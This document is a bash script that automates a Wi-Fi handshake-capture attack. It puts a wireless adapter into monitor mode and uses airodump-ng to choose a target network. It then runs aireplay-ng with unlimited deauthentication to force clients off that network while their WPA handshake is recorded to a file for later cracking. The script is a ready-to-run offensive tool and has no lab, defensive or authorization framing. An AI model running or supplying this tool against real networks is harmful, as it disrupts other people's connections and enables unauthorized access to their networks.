#!/bin/bash

# A script to capture handshakes from a wireless network.

# Function to check for root privileges
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo "This script must be run as root"
        exit 1
    fi
}

# Function to get the list of network adapters
get_adapters() {
    local adapters=$(ip link show | awk -F: '$0 ~ "wl"{print $2;getline}')
    if [ -z "$adapters" ]; then
        echo "No network adapters found."
        exit 1
    fi
    echo "$adapters"
}

# Function to switch the adapter mode
switch_adapter_mode() {
    local adapter=$1
    local mode=$2
    ip link set "$adapter" down
    iwconfig "$adapter" mode "$mode"
    ip link set "$adapter" up
}

# Main function
main() {
    check_root

    # Get the list of network adapters
    local adapters=$(get_adapters)
    local selected_adapter=$(echo "$adapters" | gum choose | sed -e 's/^[[:space:]]*//')

    # Switch the adapter to monitor mode
    switch_adapter_mode "$selected_adapter" "monitor"

    # Start airodump-ng to scan for networks
    xterm -hold -e "airodump-ng $selected_adapter" &
    local airodump_pid=$!

    # Ask the user for the BSSID and channel of the target network
    local bssid=$(gum input --prompt "BSSID: ")
    local channel=$(gum input --prompt "Channel: ")

    # Stop the airodump-ng process
    kill "$airodump_pid"

    # Start airodump-ng to capture the handshake
    local handshake_file="/tmp/handshake"
    xterm -hold -e "airodump-ng -c $channel --bssid $bssid -w $handshake_file $selected_adapter" &
    local capture_pid=$!

    # Start aireplay-ng to deauthenticate clients
    xterm -hold -e "aireplay-ng -0 0 -a $bssid $selected_adapter" &
    local deauth_pid=$!

    # Wait for the handshake to be captured
    gum spin --title "Capturing handshake..." -- sleep 30

    # Stop the capture and deauthentication processes
    kill "$capture_pid"
    kill "$deauth_pid"

    # Switch the adapter back to managed mode
    switch_adapter_mode "$selected_adapter" "managed"

    # Check if the handshake was captured
    if [ -f "${handshake_file}-01.cap" ]; then
        echo "Handshake captured successfully: ${handshake_file}-01.cap"
    else
        echo "Failed to capture handshake"
    fi
}

main "$@"
